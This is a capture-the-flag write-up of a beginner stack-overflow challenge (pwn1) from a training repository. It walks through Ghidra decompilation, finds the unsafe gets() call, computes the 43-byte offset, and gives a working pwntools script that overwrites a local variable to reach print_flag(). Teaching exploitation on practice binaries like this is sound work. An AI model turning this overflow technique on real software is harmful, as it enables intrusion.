This is a short write-up of Challenge #1 a variable overflow from [hoppersroppers nightmare repository](https://github.com/hoppersroppers/nightmare/tree/master/modules/04-Overflows).

First things first lets find out what we are working with.

```jsx
checksec pwn1
[*] '/home/user/nightmare/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

pwn1 is a `32` bit little endian binary with RELRO, a Non-Executable Stack, and PIE. We also can verify that we can run this binary but it exits as it seems to not like our answer to the question asked.

```jsx
./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
bugsy
I don't know that! Auuuuuuuugh!
```

Within Ghidra we can locate an exported function `main`. `main` has 3 main parts question 1, 2, and 3. 

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(undefined param_1)

{
  int iVar1;
  char userVar [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &param_1;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see."
      );
  puts("What... is your name?");
  fgets(userVar,0x2b,_stdin);
  iVar1 = strcmp(userVar,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(userVar,0x2b,_stdin);
  iVar1 = strcmp(userVar,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(userVar);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

Question 1: "What... is your name?"

This uses `fgets()` to safely retrieve `userVar` verify that it is within the bounds of the allocated array. It is then compared it to a hard coded string, `"Sir Lancelot of Camelot\n"`. If it is is equal we continue to the next question.

Question 2: "What... is your quest?"

Once again using `fgets()` to retrieve `userVar`, `userVar` is then compared to another hard-coded string, `"To seek the Holy Grail.\n"`. If it is equal then we continue to the third question. 

Question 3: "What... is my secret?"

This time `gets()` is used to retrieve `userVar`. Meaning that the bounds of the array are not verified and there does not appear to be any other type of safety checks. Additionally `userVar` is not being compared this time. This time `local_18` is compared to `-0x215eef38` instead of a hard-coded string and if it is equal then `print_flag()` is called. However, `local_18` is set to equal 0 so in order for the two to be equal we will need to overwrite the value of `local_18`.

Thanks to Ghidra we can view the assembly instructions of the function. This shows us that `userVar` starts at `-0x43` and `local_18` starts at `-0x18`. 

1. Offset=0x43âˆ’0x18
2. Offset=0x2B

![pwn1.png](Overflow%20Challenge%20#1%200dcf7e07e2974561ae2c6c519db471de/pwn1.png)

Viewing the assembly for `if (local_18 == -0x215eef38)` we see that local_18 is being compared to `0xdea110c8`.

![pwn2.png](Overflow%20Challenge%20#1%200dcf7e07e2974561ae2c6c519db471de/pwn2.png)

Armed with this knowledge we know we need to overwrite `0x2B` (43 bytes) prior to overwriting local_18 with the value that we want it to be, in this case `0xdea110c8`.

Hacking a Python script together I ended up with the following:

```python
from pwn import *

p = process('./pwn1')

junk = b'A' * 0x2b
comparedVal = 0xdea110c8
newLine = b'\n'

payload = [
    junk,
    p32(comparedVal),
    newLine
]

print(p.recvline())
# Question 1
print(p.recvline())
p.sendline(b'Sir Lancelot of Camelot')

# Question 2
print(p.recvline())
p.sendline(b"To seek the Holy Grail.")

# Question 3
print(p.recvline())
print("Sending payload....")
p.send(b''.join(payload))

print(p.recvline())
print(p.recvline())
```

And we got the flag!

```python
python3 ./pwn1.py
